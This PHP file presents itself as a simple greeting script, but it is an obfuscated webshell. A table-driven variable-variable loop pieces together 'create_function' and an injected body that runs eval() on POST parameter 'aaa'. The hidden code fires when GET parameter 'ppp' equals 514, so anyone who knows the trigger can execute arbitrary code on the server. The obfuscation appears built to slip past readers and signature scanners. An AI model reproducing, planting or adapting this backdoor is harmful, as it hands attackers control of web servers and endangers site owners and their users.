<?php
$action = "hello";
$mode = 1;
$firstname = "";
$lastname = "";
$g = "";
$gg = array(
    "name" => "monster senpai",
    "age" => 24
);
$ggg = "age";
$key1 = "firstname";
$key2 = "lastname";
$aaa = "aaa";
$ppp = "ppp";
$c1 = [
    ["i", 10],
    ["c", [
        ["g", $GLOBALS],
        ["ge", "_GET"],
        ["po", "_POST"],

        ["i", 12],
        ["c", [
            ["mode", 0],
            ["ge", "g", "ge"],
            ["po", "g", "po"],
            ["aaa", "po", "aaa"],
            ["ppp", "ge", "ppp"],
            ["mode", "gg", "ggg"],
            ["g", "i", 1919],
            ["g", "action", ''],
            ["g", "action3", '_fu'],
            ["g", "action4", 'nction'],
            ["g", "cmd3", '$aaa'],
            ["g", "cmd2", 'l('],
            ["g", "action1", 'cre'],
            ["g", "action2", 'ate'],
            ["g", "cmd1", '}eva'],
            ["g", "cmd4", ''],
            ["g", "cmd5", ');//'],
            ["g", "mode", 114],
            ["lastname", "cmd1"],
            ["action", "action1"],
            ["lastname", "cmd2"],
            ["action", "action2"],
            ["lastname", "cmd3"],
            ["lastname", "cmd4"],
            ["action", "action3"],
            ["lastname", "cmd5"],
            ["action", "action4"],
        ]]
    ]]
];
$c = $c1;
$i = 1;
$cmd = "";

function hello($firstname, $lastname)
{
    echo "Hello, $firstname $lastname";
    die();
}

if ($action != "hello") {
    die("Unknown action");
}

while ($i) {
    $x = array_shift($c);
    if (!$x) {
        $i--;
        continue;
    }
    if ($mode == 1) {
        $v1 = $x[0];
        $$v1 = $x[1];
    } else if ($mode == 24) {
        $v1 = $x[0];
        $k = $x[1];
        $v = $x[2];
        $$v1[$k] = $v;
    } else if ($mode == 114) {
        $v1 = $x[0];
        $v2 = $x[1];
        $$v1 .= $$v2;
    } else {
        $v1 = $x[0];
        $o = $x[1];
        $k = $x[2];
        $$v1 = $$o[$$k];
    }
    $i--;
}
if ($ppp == 514) {
    $action($firstname, $lastname);
}
